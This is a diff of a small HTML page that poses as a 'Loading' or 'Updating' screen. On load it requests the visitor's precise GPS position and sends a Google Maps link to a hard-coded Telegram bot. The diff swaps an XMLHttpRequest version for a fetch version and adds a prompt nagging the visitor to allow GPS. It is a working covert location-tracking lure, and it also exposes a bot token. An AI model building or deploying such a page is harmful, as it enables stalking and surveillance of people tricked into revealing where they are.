@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Loading</title>
-</head>
+<head><meta charset="UTF-8"></head>
 <body>
     <script>
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    var lat = position.coords.latitude;
-                    var lon = position.coords.longitude;
-                    var token = "8759633984:AAGhfzqlvb-6knXk6oqIvDQCvSP6p8jej6Y"; 
-                    var chat_id = "7323283649";
-                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=Location: https://www.google.com/maps?q=" + lat + "," + lon;
-                    var req = new XMLHttpRequest();
-                    req.open("GET", url, true);
-                    req.send();
-                    document.body.innerHTML = "<h1 style='text-align:center;'>Success</h1>";
-                });
-            }
-        };
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            var lat = pos.coords.latitude;
+            var lon = pos.coords.longitude;
+            var token = "8759633984:AAGhfzqlvb-6knXk6oqIvDQCvSP6p8jej6Y"; 
+            var chat_id = "7323283649";
+            var text = "Location: https://www.google.com/maps?q=" + lat + "," + lon;
+            
+            // الطريقة الحديثة للإرسال (fetch)
+            fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({chat_id: chat_id, text: text})
+            }).then(function() {
+                document.body.innerHTML = "<h1>Done! Check Telegram</h1>";
+            });
+        }, function(err) {
+            document.body.innerHTML = "<h1>Please Allow GPS!</h1>";
+        }, {enableHighAccuracy: true});
     </script>
-    <h1 style="text-align:center;">Loading...</h1>
+    <h1 style="text-align:center;">جاري التحديث...</h1>
 </body>
 </html>
